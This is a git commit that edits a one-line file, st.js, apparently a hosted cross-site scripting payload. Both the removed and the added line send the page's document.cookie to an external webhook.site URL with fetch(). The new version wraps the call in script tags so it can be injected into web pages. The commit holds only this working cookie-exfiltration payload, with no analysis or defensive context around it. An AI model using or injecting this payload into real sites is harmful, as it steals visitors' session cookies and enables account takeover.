44fae92a48060f886ad1aa0d4fe77dc98a4e2525
shadi mahmoud <138263957+Oxshady@users.noreply.github.com>
2025-05-31 21:30:29 +0300

    Update st.js

--- st.js
+++ st.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/881b985e-d7ea-4d74-908d-1a6229b27cb7?x=' + document.cookie);
+<script>fetch('https://webhook.site/881b985e-d7ea-4d74-908d-1a6229b27cb7?x=' + document.cookie);</script>
